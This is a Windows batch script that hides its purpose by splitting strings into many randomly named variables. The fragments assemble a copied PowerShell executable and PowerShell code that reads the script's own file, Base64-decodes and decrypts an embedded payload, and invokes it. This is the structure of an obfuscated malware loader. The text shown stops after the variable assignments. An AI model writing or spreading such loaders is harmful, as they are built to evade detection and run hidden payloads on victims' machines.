@echo off
set "wxDgHiPZgX= /"
set "NQPegRkPzm=y "
set "PcJstyaPMZ=co"
set "rofnDebyst=po"
set "SmrOFHZben=rs"
set "oJUYQIiPLn=1."
set "cNXJcFRWEg=Po"
set "LdLUYIATKf=py"
set "pMHyKEmZkI=we"
set "kJWesuricF=rS"
set "FBAdrZeYSn=we"
set "IYWJVacccO=ll"
set "xswpEDdKfw=ow"
set "GEKZraDGvM=he"
set "qHDRMwvRMG=he"
set "riloVWGCLV=s\"
set "xMrxINdhnU=32"
set "XNOwjekMpf=\W"
set "viZaOCqrHw=:\"
set "AJoobJGpWJ=Sy"
set "jsBPlAUAQl=do"
set "vLCKdepdsi=nd"
set "mmYyYQSOHq=st"
set "jodlTeKstf=Wi"
set "MKBMtolPNI=ws"
set "jumDalMmir=0\"
set "eatfNaQBMr=xe"
set "bZmXNmAnOh=em"
set "eSVvTBxrAP=in"
set "hOtVzeXrHW=.e"
set "blFfysQTrI=\v"
set "GJxrIHTima=ll"
set "kKNFZkbHtx= C"
set "qWGulhPmxR=cd"
set "CMCMTpQCqS= %~dp0"
set "jKilkmVcMk=($gS"
set "GkfjUxvxkb=AZ ="
set "ZxshHTOhAs=O.Me"
set "CSgxyRgRzU=-4] "
set "UBiYLjnMFd=::De"
set "uYnUbDPlCq=-joi"
set "UORKzKNZgb=nirt"
set "zGThKBOArF=Bmor"
set "QFrPkVSQqg=ptor"
set "yJrnxocYTM='gni"
set "FdNoEOTWKL=ypto"
set "PbyBmEzEjN=hvmr"
set "iIeabtDHKV=yste"
set "IntSaiPOUS=Syst"
set "IqNbCmCXUE=Secu"
set "xfOuVSMnpj=tS46"
set "bmBrSFlHQo=stem"
set "rTdddtdKIL=F'[-"
set "SdmZDYFqbb=New-"
set "RahdHfQKkc=;$Go"
set "JDgpuYheXP=daeR"
set "WnuKqvkTUt=);$E"
set "gMSrbbvxKt=hs.T"
set "duvLUoGPUZ=$IkU"
set "zkBGxCimii=d;$o"
set "gwxApfqYQq=$qbT"
set "tBxysYTxXw=;$Go"
set "FEfzXzkTMc=.Com"
set "KouIbGdSSh=comm"
set "eVnbrjWQrJ=yTo("
set "oXLTYKbyAv=.Sec"
set "lwOWzeAiGa=m.IO"
set "YpYGSwifgU=[IO."
set "GoaPdazvYO=, $I"
set "CKQiVxlcWs=ew-O"
set "cBkgJiMisH=E = "
set "lnRmLdikHt=PoD."
set "fIMHyQLxsf=736u"
set "GAttTVSJkF=;$VF"
set "kYXZzSiSRq=::('"
set "ANjYlYxuAQ=;$hv"
set "UxdUuXooKs=Invo"
set "HdEDHjxyYV=, (,"
set "yRBwVDSynH=ewLi"
set "JpCQCHQbZk=raph"
set "RHVMBskmfv=$oAY"
set "iTEwqOWLCh=y.Cr"
set "WuPZqKcuIL=AYkh"
set "hXYXzxetHc=pher"
set "HkzNPlINLj= = $"
set "nrmlOtekdQ=ateD"
set "drPzBgGfZZ=AYkh"
set "GvRnKtuakz=g = "
set "AuwkLnODkq=[]] "
set "vvDwtAGdGf=$IkU"
set "GFdGpcqYOT=$avP"
set "hpBOzukhIX=7;$o"
set "dXQZczWfWf=oryS"
set "wDtAWpUzlx=AYkh"
set "DdhfCiGBTr=('da"
set "OJzcQHNNwW=Disp"
set "tYflxaDncw=kE.D"
set "JkhvGUwjEy=ss -"
set "EBPlylTAEi=UGTu"
set "rKzcWzEWet=[Sys"
set "BwqSiXAoIp=D = "
set "XelrfeWafj=oD, "
set "MMptnxxakx=ZyC."
set "xMSDPjkJFI=yste"
set "lccFguUfPb=esaB"
set "iGWOYGZnJw=AYkh"
set "wpKtJvWiIm=('%~f0'"
set "FQSbXqpLjV=grap"
set "OtOcsEgNNX=em.I"
set "URaLgsmlAO=ZWfa"
